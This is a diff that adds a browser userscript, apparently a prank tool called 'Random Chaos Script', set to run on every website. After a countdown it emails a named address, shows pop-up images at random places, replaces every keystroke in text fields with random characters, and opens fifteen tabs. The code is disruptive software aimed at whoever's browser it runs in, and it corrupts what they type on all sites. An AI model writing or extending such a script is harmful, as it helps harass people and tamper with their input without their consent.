@@ -1,0 +1,131 @@
+// ==UserScript==
+// @name         Random Chaos Script (Fixed)
+// @namespace    http://tampermonkey.net/
+// @version      3.0
+// @description  Triggers chaos script 5 minutes after running with countdown and email notification.
+// @author       Master Eye
+// @match        *://*/*
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    let chaosStarted = false; // Prevents multiple triggers
+    
+    function sendEmailNotification() {
+        Email.send({
+            SecureToken: "your-smtp-token-here",
+            To: '30jaxtong@illinoislutheran.org',
+            From: 'your-email@example.com',
+            Subject: 'Chaos Script Activated',
+            Body: 'The chaos script has started!'
+        }).then(
+            message => console.log("Email sent: " + message)
+        ).catch(error => console.error('Email failed:', error));
+    }
+
+    function startChaos() {
+        console.log("🚨 Chaos Started!");
+        sendEmailNotification();
+        startRandomImageLoop();
+        startKeyChaos();
+        setTimeout(() => prankUser(15), 240000); // Start prank after 4 minutes, open 15 tabs
+    }
+
+    function createCountdownDisplay() {
+        let countdownDiv = document.createElement("div");
+        countdownDiv.id = "chaosCountdown";
+        countdownDiv.style.position = "fixed";
+        countdownDiv.style.bottom = "10px";
+        countdownDiv.style.left = "10px";
+        countdownDiv.style.background = "black";
+        countdownDiv.style.color = "white";
+        countdownDiv.style.padding = "10px";
+        countdownDiv.style.fontSize = "16px";
+        countdownDiv.style.zIndex = "9999";
+        countdownDiv.style.borderRadius = "5px";
+        document.body.appendChild(countdownDiv);
+    }
+
+    function updateCountdown(timeLeft) {
+        let countdownDiv = document.getElementById("chaosCountdown");
+        if (countdownDiv) {
+            countdownDiv.innerText = `Chaos starts in: ${timeLeft} seconds`;
+        }
+    }
+
+    function delayStart() {
+        createCountdownDisplay();
+        let timeLeft = 300;
+        updateCountdown(timeLeft);
+        let countdownInterval = setInterval(() => {
+            timeLeft--;
+            updateCountdown(timeLeft);
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                if (!chaosStarted) {
+                    chaosStarted = true;
+                    startChaos();
+                    document.getElementById("chaosCountdown").remove();
+                }
+            }
+        }, 1000);
+    }
+
+    delayStart(); // Start countdown
+
+    /*** RANDOM IMAGE DISPLAY LOGIC ***/
+    const imageUrls = [
+        "https://th.bing.com/th/id/R.361f0ffd9f619d27b38381bfbde7801b?rik=qktHBpeIckZ3bQ&riu=http%3A%2F%2Fnohmask21.com%2Fonnakei%2Fhigakionna-r1.jpg&ehk=uhNFqK7fiAj%2FDrAArneaSKKSdltrqqUcUCVPNN6%2F%2FxE%3D&risl=&pid=ImgRaw&r=0&adlt=strict",
+        "https://th.bing.com/th/id/R.e63cb1eaf9ce21580c8c2065e94c5bc9?rik=EtVl8%2FuP3Xmrww&pid=ImgRaw&r=0&adlt=strict",
+        "https://th.bing.com/th/id/OIP.QkyaANIOpn7Q42WnWxqe1gHaLW?rs=1&pid=ImgDetMain&adlt=strict"
+    ];
+
+    function showRandomImage() {
+        const imageUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
+        let img = document.createElement("img");
+        img.src = imageUrl;
+        img.style.position = "fixed";
+        img.style.bottom = Math.floor(Math.random() * window.innerHeight) + "px";
+        img.style.right = Math.floor(Math.random() * window.innerWidth) + "px";
+        img.style.width = "200px";
+        img.style.border = "3px solid white";
+        img.style.boxShadow = "0px 0px 10px rgba(0,0,0,0.5)";
+        img.style.zIndex = "9999";
+        document.body.appendChild(img);
+        setTimeout(() => img.remove(), 10000); // Remove after 10 sec
+    }
+
+    function startRandomImageLoop() {
+        setInterval(showRandomImage, 30000); // Image pops up every 30 seconds
+    }
+
+    /*** RANDOM KEY PRESS LOGIC ***/
+    const possibleKeys = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-=_+[]{}|;:'\",.<>?/`~";
+    
+    function startKeyChaos() {
+        document.addEventListener('keydown', function(event) {
+            event.preventDefault();
+            let randomKey = possibleKeys[Math.floor(Math.random() * possibleKeys.length)];
+            let activeElement = document.activeElement;
+            if (activeElement && activeElement.value !== undefined) {
+                activeElement.value += randomKey; // Insert random key into text fields
+            }
+        });
+    }
+
+    /*** PRANK USER (OPENS 10-15 TABS IN RANDOM INTERVALS) ***/
+    function prankUser(count = 15) {
+        let prankInterval = setInterval(() => {
+            if (count-- <= 0) {
+                clearInterval(prankInterval);
+                return;
+            }
+            let prankTab = window.open("https://www.google.com/search?q=you+have+been+pranked", "_blank");
+            if (prankTab) {
+                prankTab.focus();
+            }
+        }, Math.floor(Math.random() * (8000 - 3000) + 3000)); // Open a new tab every 3-8 seconds
+    }
+})();
